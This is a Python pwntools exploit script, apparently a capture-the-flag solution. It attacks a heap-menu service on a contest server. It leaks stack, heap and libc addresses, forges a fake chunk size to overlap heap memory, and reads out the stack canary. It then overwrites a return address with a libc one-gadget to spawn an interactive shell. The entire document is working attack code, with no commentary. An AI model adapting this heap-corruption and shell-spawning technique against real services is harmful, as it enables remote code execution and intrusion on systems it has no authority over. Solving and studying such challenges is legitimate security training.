from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'challenges.whitehatcontest.kr', 47850
r = remote(HOST, PORT)

libc = ELF('/=/x64.so')

menu = lambda: r.recvuntil('exit\n> ')

def sa(size, content):
	menu()
	r.sendline('46')
	r.sendline(str(size))
	r.sendline(content)

def see(index):
	menu()
	r.sendline('3')
	r.sendline(str(index))
	r.recvuntil('Data : ')
	return r.recvuntil('\n1. malloc', drop=True)

def add(size, content):
	menu()
	r.sendline('1')
	r.sendline(str(size))
	r.sendline(content)

def free(index):
	menu()
	r.sendline('2')
	r.sendline(str(index))

def modify(index, content):
	menu()
	r.sendline('4')
	r.sendline(str(index))
	r.sendline(content)

def decode(x):
	return u64(x.ljust(8, '\x00'))

sa(16*5, '')
stack = decode(see(1)) - 0x190
add(168, '')
add(168, '')
add(168, '')
add(168, '')

free(4)
free(2)
heap = decode(see(2))
libc.address = decode(see(4)) - 0x3c4b78

print hex(libc.address)
print hex(heap)
b = heap + 0x170
fake_size = b-16-stack & (2 ** 64 - 1)
print hex(fake_size)
print hex(stack)
add(0xf8, '')
pause()
modify(5, 'a' * 160 + p64(fake_size))
sa(48, p64(0x100) + p64(fake_size) + p64(stack) + p64(stack) + p64(stack) + p64(stack))
free(6)
add(512, 'a' * 0x99)
canary = '\x00' + see(8)[0x99:0xa0]
print hexdump(canary)
gadget = libc.address + 0x4526a
modify(8, 'a' * 0x98 + canary + p64(0) + p64(gadget) + '\x00' * 0x100)
pause()
r.sendline('5')
r.interactive()